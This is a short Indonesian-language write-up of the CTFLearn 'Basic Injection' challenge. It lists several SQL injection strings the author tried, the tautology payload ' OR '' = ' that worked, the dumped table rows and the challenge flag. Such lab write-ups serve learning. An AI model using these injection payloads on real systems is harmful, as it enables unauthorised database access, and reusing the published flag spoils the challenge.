### Basic Injection
Challenge ini adalah challenge ertama saya saat mencoba belajar di [CTFLearn](ctflearn.com)

### Pertanyaan


See if you can leak the whole database using what you know about SQL Injections. [Link](https://web.ctflearn.com/web4/)

Don't know where to begin? Check out CTFlearn's SQL Injection Lab [Link](https://ctflearn.com/lab/sql-injection-part-1)

### Cara mengerjakan

Pada awal membuka [Challenge](https://web.ctflearn.com/web4/) kita akan disuguhkan tampilan web dengan input, pada awalnya saya bingun ingin menambahkan apa. Lalu saya kemudian mencoba beberapa SQL injection yang pernah saya pelajari seperti :
```
admin' OR '1' = '1' -- '
' OR '' = ''
name = '' AND pass = '1' = '1'
```
Dan ternyta gagal, saya pun searching di internet, kemudian mendapatkan jawaban dari TurtledCoder di [Medium](https://medium.com/@TurtledCoder/ctflearn-com-basic-injection-4dc5114e911c) , di sana dia menjelaskan kalau kita meng-inspect web tersebut maka akan ada komentar pada source codenya, yaitu :
```
<!-- Try some names like Hiroki, Noah, Luke -->
```
lalu saya coba masukan semua nama, dan ternyata yang berhasil adalah Luke
```
Name: Luke
Data: I made this problem. 
```
tetapi, tidak ada flag yang saya temukan, kemudian dalam artikel TurtledCoder tadi, saya membaca lagi, dan menemukan kalau cara mendapatkan informasi lain adalah dengan cara mengetik 
```
' OR '' = '
```
Setelah itu munculah banyak data termasuk flag
```
 Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```
